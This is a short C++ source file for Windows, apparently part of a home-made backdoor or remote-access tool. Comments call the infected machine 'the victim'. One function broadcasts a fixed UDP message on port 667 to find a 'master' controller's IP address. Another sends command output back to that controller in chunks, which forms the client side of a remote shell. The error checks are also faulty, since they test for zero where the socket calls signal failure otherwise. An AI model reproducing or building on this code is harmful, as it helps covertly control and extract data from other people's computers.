#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include"Network.h"
#include<WinSock2.h>
#include<Ws2tcpip.h>
#include<windows.h>
#pragma comment(lib, "ws2_32.lib")

uint32_t findMastersIP()
{
    sockaddr_in sockinfo;
    sockaddr_in mastersinfo;
    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
    int error;

    std::string message, response;
    char* buf = new char[65536];
    int fromlen = sizeof(mastersinfo);

    /*the victim will broadcast to port 667 that he needs the master's ip*/
    sockinfo.sin_addr.s_addr = inet_addr("255.255.255.255");
    sockinfo.sin_port = htons(667);
    sockinfo.sin_family = AF_INET;

    mastersinfo.sin_addr.s_addr = 0;

    /*fixed messages for my "protocol"*/
    message = "Hello, how's your day?";
    response = "Oh I'm great";

    error = sendto(s, message.c_str(), message.size(), 0, (sockaddr*)&sockinfo, sizeof(sockinfo));
    if (!error)
        goto errorLable;
    
    do{
        error = recvfrom(s, buf, 65536, 0, (sockaddr*)&mastersinfo, &fromlen);
        if (!error)
            break;
    } while (!std::string(buf)._Equal(response));
errorLable:
    delete[] buf;
    closesocket(s);
    return mastersinfo.sin_addr.s_addr;
}

int sendStdOut(SOCKET s, std::string& message)
{
    std::string part;
    if (message.size() == 0)
    {
        part = "no output";
        if (!send(s, part.c_str(), part.size(), 0))
            return 1;
    }

    /*spilitting messages to 4096*/
    while (message.size() >= 4096)
    {
        part = message.substr(0, 4095);
        message = message.substr(4095);
        if(!send(s, part.c_str(), part.size(), 0))
            return 1;
    }

    if(!send(s, message.c_str(), message.size(), 0))
        return 1;

    return 0;
}
